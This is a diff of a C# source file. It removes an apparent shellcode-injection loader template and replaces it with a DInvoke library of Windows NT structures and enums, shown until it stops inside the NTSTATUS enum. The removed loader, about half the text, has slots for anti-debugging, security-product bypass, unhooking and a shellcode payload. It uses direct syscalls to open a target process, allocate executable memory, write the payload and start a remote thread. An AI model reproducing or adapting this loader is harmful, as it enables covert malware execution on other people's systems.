@@ -1,247 +1,184 @@
-using System;
-using System.Diagnostics;
+﻿using System;
 using System.Runtime.InteropServices;
-using System.Collections.Generic;
 
-//####USING####
-
-namespace Rose
+namespace DInvoke.Data
 {
-
-    //####CODE####
-
-    public class Rose
+    /// <summary>
+    /// Native is a library of enums and structures for Native (NtDll) API functions.
+    /// </summary>
+    /// <remarks>
+    /// A majority of this library is adapted from signatures found at www.pinvoke.net.
+    /// </remarks>
+    public static class Native
     {
-
-        public static void Main(string[] args)
+        [StructLayout(LayoutKind.Sequential)]
+        public struct UNICODE_STRING
         {
-            //####DELAY####
-
-            //####ANTIDEBUG####
-
-            //####BYPASS####
-
-            //####UNHOOK####
-
-            var encoded = ####SHELLCODE####;
-
-            //####CALL####
-
-            // NtOpenProcess
-            IntPtr stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
-            NtOpenProcess ntOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));
-
-            IntPtr hProcess = IntPtr.Zero;
-            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
-
-            Int32 pid = Process.GetCurrentProcess().Id;
-            if(args.Length > 0){
-                int.TryParse(args[0], out pid);
-                if (pid < 0)
-                {
-                    Console.WriteLine("[-] Error: Process not found");
-                    Environment.Exit(1);
-                }
-            } else {
-                //####FIND_PROCESS####
-            }
-
-            CLIENT_ID ci = new CLIENT_ID
-            {
-                UniqueProcess = (IntPtr)pid
-            };
-
-            NTSTATUS result = ntOpenProcess(
-                ref hProcess,
-                0x001F0FFF,
-                ref oa,
-                ref ci);
-
-            // NtAllocateVirtualMemory
-            stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
-            NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
-
-            IntPtr baseAddress = IntPtr.Zero;
-            IntPtr regionSize = (IntPtr)decoded.Length;
-
-            result = ntAllocateVirtualMemory(
-                hProcess,
-                ref baseAddress,
-                IntPtr.Zero,
-                ref regionSize,
-                0x1000 | 0x2000,
-                0x40);
-
-            // NtWriteVirtualMemory
-            stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
-            NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
-
-            var buffer = Marshal.AllocHGlobal(decoded.Length);
-            Marshal.Copy(decoded, 0, buffer, decoded.Length);
-
-            uint bytesWritten = 0;
-
-            result = ntWriteVirtualMemory(
-                hProcess,
-                baseAddress,
-                buffer,
-                (uint)decoded.Length,
-                ref bytesWritten);
-
-            Console.WriteLine("Alocated memory and shellcode written");
-            Console.ReadKey();
-
-            // NtProtectVirtualMemory
-            stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
-            NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
-
-            uint oldProtect = 0;
-
-            result = ntProtectVirtualMemory(
-                hProcess,
-                ref baseAddress,
-                ref regionSize,
-                0x20,
-                ref oldProtect);
-
-            // NtCreateThreadEx
-            stub = DInvoke.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
-            NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));
-
-            IntPtr hThread = IntPtr.Zero;
-
-            Console.WriteLine("RWX -> RX");
-            Console.WriteLine("Press a button to execute");
-            Console.ReadKey();
-
-            result = ntCreateThreadEx(
-                out hThread,
-                ACCESS_MASK.STANDARD_RIGHTS_ALL | ACCESS_MASK.SPECIFIC_RIGHTS_ALL,
-                IntPtr.Zero,
-                hProcess,
-                baseAddress,
-                IntPtr.Zero,
-                false,
-                0,
-                0,
-                0,
-                IntPtr.Zero);
+            public UInt16 Length;
+            public UInt16 MaximumLength;
+            public IntPtr Buffer;
         }
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate NTSTATUS NtOpenProcess(
-            ref IntPtr ProcessHandle,
-            uint DesiredAccess,
-            ref OBJECT_ATTRIBUTES ObjectAttributes,
-            ref CLIENT_ID ClientId);
+        [StructLayout(LayoutKind.Sequential)]
+        public struct ANSI_STRING
+        {
+            public UInt16 Length;
+            public UInt16 MaximumLength;
+            public IntPtr Buffer;
+        }
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate NTSTATUS NtAllocateVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            IntPtr ZeroBits,
-            ref IntPtr RegionSize,
-            uint AllocationType,
-            uint Protect);
+        public struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr ExitStatus;
+            public IntPtr PebBaseAddress;
+            public IntPtr AffinityMask;
+            public IntPtr BasePriority;
+            public UIntPtr UniqueProcessId;
+            public int InheritedFromUniqueProcessId;
 
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate NTSTATUS NtWriteVirtualMemory(
-            IntPtr ProcessHandle,
-            IntPtr BaseAddress,
-            IntPtr Buffer,
-            uint BufferLength,
-            ref uint BytesWritten);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate NTSTATUS NtProtectVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            ref IntPtr RegionSize,
-            uint NewProtect,
-            ref uint OldProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate NTSTATUS NtCreateThreadEx(
-            out IntPtr threadHandle,
-            ACCESS_MASK desiredAccess,
-            IntPtr objectAttributes,
-            IntPtr processHandle,
-            IntPtr startAddress,
-            IntPtr parameter,
-            bool createSuspended,
-            int stackZeroBits,
-            int sizeOfStack,
-            int maximumStackSize,
-            IntPtr attributeList);
+            public int Size
+            {
+                get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
+            }
+        }
 
         [StructLayout(LayoutKind.Sequential, Pack = 0)]
-        struct OBJECT_ATTRIBUTES
+        public struct OBJECT_ATTRIBUTES
         {
-            public int Length;
+            public Int32 Length;
             public IntPtr RootDirectory;
-            public IntPtr ObjectName;
+            public IntPtr ObjectName; // -> UNICODE_STRING
             public uint Attributes;
             public IntPtr SecurityDescriptor;
             public IntPtr SecurityQualityOfService;
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        struct CLIENT_ID
+        public struct IO_STATUS_BLOCK
+        {
+            public IntPtr Status;
+            public IntPtr Information;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct CLIENT_ID
         {
             public IntPtr UniqueProcess;
             public IntPtr UniqueThread;
         }
 
-        [Flags]
-        enum ACCESS_MASK : uint
+        [StructLayout(LayoutKind.Sequential)]
+        public struct OSVERSIONINFOEX
         {
-            DELETE = 0x00010000,
-            READ_CONTROL = 0x00020000,
-            WRITE_DAC = 0x00040000,
-            WRITE_OWNER = 0x00080000,
-            SYNCHRONIZE = 0x00100000,
-            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
-            STANDARD_RIGHTS_READ = 0x00020000,
-            STANDARD_RIGHTS_WRITE = 0x00020000,
-            STANDARD_RIGHTS_EXECUTE = 0x00020000,
-            STANDARD_RIGHTS_ALL = 0x001F0000,
-            SPECIFIC_RIGHTS_ALL = 0x000FFFF,
-            ACCESS_SYSTEM_SECURITY = 0x01000000,
-            MAXIMUM_ALLOWED = 0x02000000,
-            GENERIC_READ = 0x80000000,
-            GENERIC_WRITE = 0x40000000,
-            GENERIC_EXECUTE = 0x20000000,
-            GENERIC_ALL = 0x10000000,
-            DESKTOP_READOBJECTS = 0x00000001,
-            DESKTOP_CREATEWINDOW = 0x00000002,
-            DESKTOP_CREATEMENU = 0x00000004,
-            DESKTOP_HOOKCONTROL = 0x00000008,
-            DESKTOP_JOURNALRECORD = 0x00000010,
-            DESKTOP_JOURNALPLAYBACK = 0x00000020,
-            DESKTOP_ENUMERATE = 0x00000040,
-            DESKTOP_WRITEOBJECTS = 0x00000080,
-            DESKTOP_SWITCHDESKTOP = 0x00000100,
-            WINSTA_ENUMDESKTOPS = 0x00000001,
-            WINSTA_READATTRIBUTES = 0x00000002,
-            WINSTA_ACCESSCLIPBOARD = 0x00000004,
-            WINSTA_CREATEDESKTOP = 0x00000008,
-            WINSTA_WRITEATTRIBUTES = 0x00000010,
-            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
-            WINSTA_EXITWINDOWS = 0x00000040,
-            WINSTA_ENUMERATE = 0x00000100,
-            WINSTA_READSCREEN = 0x00000200,
-            WINSTA_ALL_ACCESS = 0x0000037F,
+            public uint OSVersionInfoSize;
+            public uint MajorVersion;
+            public uint MinorVersion;
+            public uint BuildNumber;
+            public uint PlatformId;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
+            public string CSDVersion;
+            public ushort ServicePackMajor;
+            public ushort ServicePackMinor;
+            public ushort SuiteMask;
+            public byte ProductType;
+            public byte Reserved;
+        }
 
-            SECTION_ALL_ACCESS = 0x10000000,
-            SECTION_QUERY = 0x0001,
-            SECTION_MAP_WRITE = 0x0002,
-            SECTION_MAP_READ = 0x0004,
-            SECTION_MAP_EXECUTE = 0x0008,
-            SECTION_EXTEND_SIZE = 0x0010
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LIST_ENTRY
+        {
+            public IntPtr Flink;
+            public IntPtr Blink;
+        }
+
+        public enum MEMORYINFOCLASS : int
+        {
+            MemoryBasicInformation = 0,
+            MemoryWorkingSetList,
+            MemorySectionName,
+            MemoryBasicVlmInformation
+        }
+
+        public enum PROCESSINFOCLASS : int
+        {
+            ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
+            ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
+            ProcessIoCounters, // q: IO_COUNTERS
+            ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX
+            ProcessTimes, // q: KERNEL_USER_TIMES
+            ProcessBasePriority, // s: KPRIORITY
+            ProcessRaisePriority, // s: ULONG
+            ProcessDebugPort, // q: HANDLE
+            ProcessExceptionPort, // s: HANDLE
+            ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
+            ProcessLdtInformation, // 10
+            ProcessLdtSize,
+            ProcessDefaultHardErrorMode, // qs: ULONG
+            ProcessIoPortHandlers, // (kernel-mode only)
+            ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
+            ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
+            ProcessUserModeIOPL,
+            ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
+            ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
+            ProcessWx86Information,
+            ProcessHandleCount, // 20, q: ULONG, PROCESS_HANDLE_INFORMATION
+            ProcessAffinityMask, // s: KAFFINITY
+            ProcessPriorityBoost, // qs: ULONG
+            ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
+            ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
+            ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
+            ProcessWow64Information, // q: ULONG_PTR
+            ProcessImageFileName, // q: UNICODE_STRING
+            ProcessLUIDDeviceMapsEnabled, // q: ULONG
+            ProcessBreakOnTermination, // qs: ULONG
+            ProcessDebugObjectHandle, // 30, q: HANDLE
+            ProcessDebugFlags, // qs: ULONG
+            ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: size 0 disables, otherwise enables
+            ProcessIoPriority, // qs: ULONG
+            ProcessExecuteFlags, // qs: ULONG
+            ProcessResourceManagement,
+            ProcessCookie, // q: ULONG
+            ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
+            ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION
+            ProcessPagePriority, // q: ULONG
+            ProcessInstrumentationCallback, // 40
+            ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
+            ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]
+            ProcessImageFileNameWin32, // q: UNICODE_STRING
+            ProcessImageFileMapping, // q: HANDLE (input)
+            ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
+            ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
+            ProcessGroupInformation, // q: USHORT[]
+            ProcessTokenVirtualizationEnabled, // s: ULONG
+            ProcessConsoleHostProcess, // q: ULONG_PTR
+            ProcessWindowInformation, // 50, q: PROCESS_WINDOW_INFORMATION
+            ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
+            ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
+            ProcessDynamicFunctionTableInformation,
+            ProcessHandleCheckingMode,
+            ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
+            ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
+            MaxProcessInfoClass
         };
 
-        [Flags]
-        enum NTSTATUS : uint
+        /// <summary>
+        /// NT_CREATION_FLAGS is an undocumented enum. https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html
+        /// </summary>
+        public enum NT_CREATION_FLAGS : ulong
+        {
+            CREATE_SUSPENDED = 0x00000001,
+            SKIP_THREAD_ATTACH = 0x00000002,
+            HIDE_FROM_DEBUGGER = 0x00000004,
+            HAS_SECURITY_DESCRIPTOR = 0x00000010,
+            ACCESS_CHECK_IN_TARGET = 0x00000020,
+            INITIAL_THREAD = 0x00000080
+        }
+
+        /// <summary>
+        /// NTSTATUS is an undocument enum. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
+        /// https://www.pinvoke.net/default.aspx/Enums/NtStatus.html
+        /// </summary>
+        public enum NTSTATUS : uint
         {
             // Success
             Success = 0x00000000,
